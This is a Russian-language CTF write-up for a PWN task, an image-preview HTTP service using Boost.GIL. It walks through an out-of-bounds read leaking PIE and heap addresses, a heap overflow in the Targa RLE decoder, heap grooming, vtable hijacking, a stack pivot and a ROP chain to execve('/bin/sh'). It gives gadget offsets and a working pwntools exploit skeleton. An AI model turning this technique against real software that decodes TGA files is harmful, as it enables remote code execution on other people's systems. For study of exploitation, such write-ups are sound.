# Райтап: `image-viewer` (PWN, Boost.GIL)

---

## 0. Что дано

HTTP-сервис превью изображений. Умеет:

* `GET /` — HTML-страница с формой загрузки;
* `POST /process` — принять TGA, декодировать его Boost.GIL, прогнать
  «фильтр» и вернуть результат.

В задаче две независимые уязвимости:

1. OOB read в прогрессивном превью: окно документа ограничивается
   клиентским `X-Preview-Depth`, а не реальным размером пикселя. Даёт утечку
   PIE и heap.
2. В RLE-декодере Targa из Boost.GIL: счётчик пикселей чанка не
   ограничивается остатком буфера → переполнение кучи вперёд.

Эксплуатация: утечка → гроуминг кучи → переполнение во vtable объекта-фильтра →
stack pivot → ROP → `execve("/bin/sh")`.

---

## 1. Разведка бинаря

```bash
$ file public/service
ELF 64-bit LSB pie executable, x86-64, static-pie linked, stripped

$ ldd public/service
        statically linked
```

Защиты (checksec):

| Защита | Состояние |
|---|---|
| PIE / ASLR | вкл (static PIE, полное ASLR) |
| RELRO | full (`-z relro -z now`) |
| NX | вкл |
| Stack canary | вкл (`-fstack-protector-strong`) |
| FORTIFY | вкл (`_FORTIFY_SOURCE=2`) |
| Символы | stripped |
| Static | да (нет зависимостей от libc/libstdc++) |

Сборка дополнительно чистится: `-DNDEBUG -DBOOST_DISABLE_ASSERTS` (чтобы
`assert()`-сообщения с `__FILE__` не тащили пути Boost в `.rodata`), затем
`strip --strip-all` и `objcopy`, убирающий `.comment`, `.note.gnu.build-id`,
`.note.stapsdt`, `.stapsdt.base`.

Строки, которые стоит найти сразу:

```bash
strings -a public/service | grep -E 'X-|/process|image-viewer'
# X-Filter, X-Preview-Size, X-Preview-Offset, X-Preview-Length,
# X-Preview-Depth, X-Scale, X-Gamma, X-Image, POST /process ...
```

Они дают протокол и намекают, где реверсить.

---

## 2. Протокол `POST /process`

```
POST /process HTTP/1.1
Host: x
Content-Length: <n>
X-Filter: gray | warm
X-Preview-Size: <n>       # размер двух scratch-буферов
X-Scale: <int>            # аргумент фильтра
X-Gamma: <int>            # аргумент фильтра
X-Preview-Offset: <n>     # окно превью: начало (байты)
X-Preview-Length: <n>     # окно превью: длина (байты)
X-Preview-Depth: <n>      # заявленная битность вывода

<TGA-файл>
```

Ответ без окна превью:

```
HTTP/1.1 200 OK
X-Image: <w>x<h>
```

С окном превью — сырые байты окна в теле, `Content-Type: image/x-tga`.
Именно этот канал и используется для утечки (снаружи выглядит как «сервис
вернул картинку»).

---

## 3. Реверс обработчика

`handle_connection` (после `strip` ищем по строкам `X-Preview-*` и восстанавливаем):

1. читает заголовки (побайтово);
2. парсит `Content-Length`, `X-Filter`, `X-Preview-Size`, `X-Scale`,
   `X-Gamma`, `X-Preview-Offset`, `X-Preview-Length`, `X-Preview-Depth`;
3. читает тело (TGA) в буфер фиксированного размера;
4. создаёт render job:
   ```cpp
   void* scratch_lo = malloc(preview);          // preview = X-Preview-Size
   void* scratch_hi = malloc(preview);
   Filter* filter   = make_filter(name, scratch_lo, scratch_hi); // new, 0x190
   free(scratch_hi);
   free(scratch_lo);
   ```
5. декодирует картинку через `boost::gil::read_image(..., targa_tag())`;
6. если задано окно превью — читает его из декодированного буфера и отдаёт телом;
7. вызывает `filter->apply(scale, gamma)` — виртуальный вызов.

Класс фильтра:

```cpp
struct Filter {
    virtual ~Filter();
    virtual void apply(int width, int height) = 0;
    char opts[0x180];          // сюда make_filter кладёт scratch_lo/scratch_hi
};
```

`make_filter` помечен `noinline` и принимает указатели на scratch-буферы —
это фиксирует порядок аллокаций (важно для гроуминга; GCC иначе любит
переставлять `operator new`/`malloc`).

---

## 4. Уязвимость №1 — OOB read в превью (неверный размер окна)

Код окна превью (упрощённо):

```cpp
long depth_bytes = preview_depth > 0 ? (preview_depth + 7) / 8 : 3; // от клиента
long stride = (long)width * depth_bytes;
long frame  = (long)height * stride;      // размер кадра — НЕВЕРНЫЙ
if( off < 0 ) off = 0;
if( off + len > frame ) len = (off < frame) ? frame - off : 0;
for( long i = 0; i < len; ++i )
    winbuf[i] = pix[off + i];
```

Проверка `off + len <= frame` есть и внутренне согласована, поэтому
выглядит безопасно. Но `frame` считается по клиентскому `X-Preview-Depth`,
а реальный буфер декодера — всегда `width*height*3` (rgb8).

Для 76×1: реальный буфер `76*1*3 = 228`. Если клиент заявит
`X-Preview-Depth: 64`, то `depth_bytes = 8`, `frame = 1 * 76*8 = 608`.

```text
off = 0x1e0 = 480, len = 120  ->  off+len = 600 <= 608  (проверка проходит)
реальный буфер 228 байт   ->  читаем [480 .. 600)  = OOB read
```

То есть читаем за концом буфера — в объект-фильтр.

Запрос утечки:

```
X-Filter: gray
X-Preview-Size: 228
X-Preview-Offset: 480
X-Preview-Length: 120
X-Preview-Depth: 64
```

Тело ответа (120 байт) начинается с объекта-фильтра:

| смещение | что |
|---|---|
| `+0x00` | `vptr` фильтра (адрес в PIE) |
| `+0x08` | `scratch_lo` (heap) |
| `+0x10` | `scratch_hi` (heap) |

Отсюда (см. §6):

```python
base   = u64(body, 0) - 0x206d90   # _ZTV10GrayFilter + 0x10
filter = u64(body, 8) + 0x1e0      # scratch_lo + 0x1e0
```

> Почему утечка валидна между запросами: сервис — fork-сервер
> (`accept → fork`), потомки наследуют ASLR-раскладку родителя. Мы не делаем
> `exec` на соединение, поэтому адреса из benign-запроса (соединение 1)
> подходят эксплойт-запросу (соединение 2). Важно слать одинаковые по длине
> заголовки/тело в обоих запросах, иначе раскладка кучи разъедется.

---

## 5. Уязвимость №2 — OOB write в Targa RLE

`read_rle_data` (Boost.GIL):

```cpp
size_t image_size = width * height * bytes_per_pixel;
byte_vector_t image_data(image_size);

for (size_t pixel = 0; pixel < image_size; ) {
    uint8_t c = read_uint8();
    if (c & 0x80) {                       // run-чанк
        uint8_t chunk_length = c - 127;   // 1..128
        for (i = 0; i < chunk_length; ++i, pixel += bpp)
            memcpy(&image_data[pixel], pixel_data, bpp);  // без проверки
    } else {                              // raw-чанк
        uint8_t chunk_length = c + 1;     // 1..128
        size_t n = chunk_length * bpp;
        read(&image_data[pixel], n);      // без проверки, произвольные байты
        pixel += n;
    }
}
```

Проверка `pixel < image_size` стоит только **на границе чанков**. Последний
чанк, начавшийся у конца буфера, пишет за него до `128*bpp - остаток` байт.

Для 24 bpp максимум ≈ 383 байта, содержимое полностью из файла (raw-чанк).
Это переполнение вперёд — идеально, чтобы достать следующий чанк кучи.

---

## 6. Heap grooming

Берём TGA type 10, 24 bpp, 76×1:

```
image_size = 76*1*3 = 228 = 0xe4
chunk      = request2size(228) = 0xf0 (240)
```

`X-Preview-Size: 228`, значит оба scratch-буфера — тоже `0xf0`.

Порядок аллокаций (зафиксирован `noinline`-фабрикой):

```
 malloc lo (0xf0)      -> L
 malloc hi (0xf0)      -> L+0xf0
 new Filter (0x190)    -> L+0x1e0
 free(hi); free(lo)
```

После free: `tcache[0xf0] = lo -> hi`.

Декодирование:

* `img.recreate()` аллоцирует буфер назначения `D` (228 → `0xf0`) → берёт `lo`;
* `read_rle_data` аллоцирует `image_data` (228 → `0xf0`) → берёт `hi`.

Итоговая раскладка:

```
   D = lo (0xf0)      image_data = hi (0xf0)      Filter (0x190)
  +---------------+  +----------------------+  +----------------+
  |  228 байт     |  |      228 байт        |  | vptr | opts... |
  +---------------+  +----------------------+  +----------------+
        ^ база окна превью   ^ сюда пишет RLE-переполнение
                               (фильтр сразу за hi)
```

`image_data` лежит непосредственно под объектом-фильтром, поэтому
переполнение попадает в `vptr`.

### Раскладка потока RLE

Нужно довести `pixel` до `image_size - 3 = 225` и затем дать raw-чанк:

```
run-чанк  0xCA  (=202) : chunk_length = 75 px = 225 байт  -> pixel = 225
raw-чанк  0x7F  (=127) : chunk_length = 128 px = 384 байта
```

`raw[0]` пишется в `image_data[225]`. Объект-фильтр находится в
`image_data + 0xf0 = image_data + 240`, значит:

```
raw[15 + k]  соответствует  Filter[k]
```

* `raw[7:15]` = размер чанка фильтра `0x191` (`0x190 | PREV_INUSE`) — чтобы не
  сломать кучу;
* `raw[15]` = `Filter[0]` = новый `vptr`.

---

## 7. Утечка PIE и heap

Отдельным «benign»-запросом (валидная картинка 76×1 того же размера) делаем
превью с `Offset=0x1e0, Length=120, Depth=64`. Тело ответа:

```python
vptr       = u64(body, 0x00)      # PIE pointer
scratch_lo = u64(body, 0x08)      # heap pointer
base       = vptr - 0x206d90      # _ZTV10GrayFilter + 0x10
filter     = scratch_lo + 0x1e0   # объект-фильтр
```

Почему `scratch_lo + 0x1e0`: `lo` чанк `0xf0`, `hi` чанк `0xf0`, фильтр
начинается с `lo + 0xf0 + 0xf0 = lo + 0x1e0`.

---

## 8. Угон vtable: `r13`, stage-0 и pivot

Виртуальный вызов компилируется в:

```asm
mov rax, [r13]         ; rax = Filter->vptr
...
mov rdi, r13           ; rdi = this
call QWORD PTR [rax+0x10]
```

`apply` — **третий** слот vtable (после двух деструкторов), поэтому вызов
идёт через `[vptr+0x10]`. В момент вызова:

* `rdi = r13 = filter` (объект),
* `rax = vptr` (наше значение),
* `rsi = scale`, `rdx = gamma`.

### Проблема: компилятор держит объект в `r13`, а не в `rbx`

Единственный пригодный stack-pivot в бинаре — `rbx`-овый:

```
0x186ced: mov rsp, rbx
          mov rbx, [rsp]
          add rsp, 0x30
          ret
```

Но на вызове `rbx` = указатель на `img` (стек), а объект — в `r13`.
Поэтому ставим stage-0 гаджет, который перекладывает объект в `rbx`
и вызывает следующий указатель из самого объекта:

```
0x65a39: mov rbx, rdi              ; rbx = filter
         sub rsp, 8
         mov rdi, [rdi+0xc8]       ; rdi = *(filter+0xc8)
         mov rax, [rdi]            ; rax = *(rdi)
         call [rax+0x30]
```

### Фейковая vtable и stage-0 в объекте

```
Filter[0x00] = filter + 0x08       # vptr -> фейковая vtable внутри объекта
Filter[0x18] = base + G1           # [vptr+0x10] = stage-0
Filter[0xc8] = filter + 0xd0       # (filter+0xc8) -> Q
Filter[0xd0] = filter + 0xd8       # *Q = R
Filter[0x108]= base + PIVOT        # *(R+0x30) = pivot
```

Тогда:

1. диспетчеризация: `rax = Filter[0] = filter+0x08`;
   `call [rax+0x10] = [filter+0x18] = G1`;
2. `G1`: `rbx = filter`; `rdi = *(filter+0xc8) = filter+0xd0`;
   `rax = *(filter+0xd0) = filter+0xd8`;
   `call *(rax+0x30) = *(filter+0x108) = PIVOT`;
3. `PIVOT`: `rsp = rbx = filter`; `add rsp,0x30`; `ret` →
   исполнение начинается с `filter+0x30`.

---

## 9. ROP: `execve("/bin/sh", NULL, NULL)`

Цепочка кладётся в объект (тоже переполнением), начиная с `filter+0x30`:

```
filter+0x30 : pop rax ; ret            0x3b4aa
filter+0x38 : 59                       # __NR_execve
filter+0x40 : pop rdi ; ret            0x1cca4
filter+0x48 : filter+0x80              # "/bin/sh"
filter+0x50 : pop rsi ; ret            0x239af
filter+0x58 : 0                        # argv = NULL
filter+0x60 : pop rdx ; pop rbx ; ret  0x15d0eb
filter+0x68 : 0
filter+0x70 : 0                        # envp = NULL
filter+0x78 : syscall ; ret            0x101d76
filter+0x80 : "/bin/sh\0"
```

Почему именно syscall, а не `system`:

* бинарь статический и не содержит `system`/`execve`-обёрток (они не
  использовались → линкер их не подтянул), а строки `"/bin/sh"` в нём нет;
* `syscall` есть всегда; `execve` = syscall №59.

Почему не два вложенных `call` (как было бы с `system`): лишний `call`
сдвигает `rsp` на 8 и ломает 16-байтовое выравнивание; `sudo`-подобные
функции glibc падают на `movaps`. Прямой `syscall` через ROP этого лишён.

После `execve` процесс замещается `/bin/sh`. Так как в потомке
`dup2(c,0/1/2)`, шелл общается прямо через сокет.

---

## 10. Эксплойт

Ключевые константы (static PIE, оффсеты от базы):

```
VTABLE_GRAY_OBJ = 0x206d90   # _ZTV10GrayFilter + 0x10
G1              = 0x65a39
PIVOT           = 0x186ced
POP_RAX         = 0x3b4aa
POP_RDI         = 0x1cca4
POP_RSI         = 0x239af
POP_RDX_RBX     = 0x15d0eb
SYSCALL         = 0x101d76
```

Каркас (полный — `solve/exploit.py`):

```python
def leak():
    r = remote(HOST, PORT)
    r.send(req_for(benign_tga()))          # Offset=0x1e0, Length=120, Depth=64
    data = r.recvall(timeout=3)
    raw = data.split(b"\r\n\r\n", 1)[1]     # окно превью = тело
    vptr       = u64(raw, 0)
    scratch_lo = u64(raw, 8)
    base   = vptr - VTABLE_GRAY_OBJ
    filter = scratch_lo + 0x1e0
    return filter, base

def exploit_tga(vaddr, base):
    raw = bytearray(384)
    raw[7:15] = p64(0x191)                  # размер чанка фильтра
    put = lambda off, val: raw.__setitem__(
        slice(15+off, 15+off+8), p64(val))
    put(0x00, vaddr + 0x08)                 # vptr
    put(0x18, base + G1)                    # слот apply
    put(0xC8, vaddr + 0xD0); put(0xD0, vaddr + 0xD8)
    put(0x108, base + PIVOT)                # stage-0 -> pivot
    # ROP
    chain = [base+POP_RAX, 59,
             base+POP_RDI, vaddr+0x80,
             base+POP_RSI, 0,
             base+POP_RDX_RBX, 0, 0,
             base+SYSCALL]
    off = 0x30
    for v in chain: put(off, v); off += 8
    raw[15+0x80:15+0x88] = b"/bin/sh\x00"
    body = b"\xca\x00\x00\x00\x7f" + bytes(raw)
    return hdr() + body
```

Запуск:

```bash
python3 solve/exploit.py <host> 1337
[+] heap=0x...  pie_base=0x...
[+] FLAG: ctfcup{baby_LLM_pwn_%s}
```

Эксплойт шлёт `cat /flag` в тот же сокет после эксплойт-запроса; `/bin/sh`
читает команду из сокета и печатает флаг.

---

## 11. Флаг

```
ctfcup{baby_LLM_pwn_%s}
```
